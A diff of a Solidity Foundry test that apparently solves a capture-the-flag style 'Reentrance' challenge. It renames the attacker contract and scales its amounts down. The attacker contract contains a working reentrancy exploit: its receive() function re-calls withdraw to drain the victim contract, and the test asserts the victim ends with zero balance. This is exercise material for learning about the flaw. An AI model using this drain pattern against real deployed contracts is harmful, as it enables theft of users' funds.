@@ -4,21 +4,21 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "../src/Reentrance.sol";
 
-contract Reentrant {
+contract MiddleMan {
     Reentrance public reentrance;
     uint8 counter;
 
-    constructor(address payable prey) {
+    constructor(address payable prey) payable {
         reentrance = Reentrance(prey);
     }
 
     function attack() public {
-        reentrance.donate{value: 1 ether}(address(this));
-        reentrance.withdraw(1 ether);
+        reentrance.donate{value: 0.001 ether}(address(this));
+        reentrance.withdraw(0.001 ether);
     }
 
     receive() external payable {
-        reentrance.withdraw(1 ether);
+        reentrance.withdraw(0.001 ether);
     }
 }
 
@@ -29,17 +29,14 @@ contract ReentranceTest is Test {
     function setUp() public {
         vm.deal(alice, 1 ether);
         reentrance = new Reentrance();
-        vm.deal(address(reentrance), 3 ether);
+        vm.deal(address(reentrance), 0.003 ether);
     }
 
     function test() public {
-        assertEq(address(reentrance).balance, 3 ether);
-
-        Reentrant reentrant = new Reentrant(payable(address(reentrance)));
-        vm.deal(address(reentrant), 1 ether);
-        reentrant.attack();
+        MiddleMan middleMan = new MiddleMan{value: 0.001 ether}(payable(address(reentrance)));
+        middleMan.attack();
 
         assertEq(address(reentrance).balance, 0 ether);
-        assertEq(address(reentrant).balance, 4 ether);
+        assertEq(address(middleMan).balance, 0.004 ether);
     }
 }
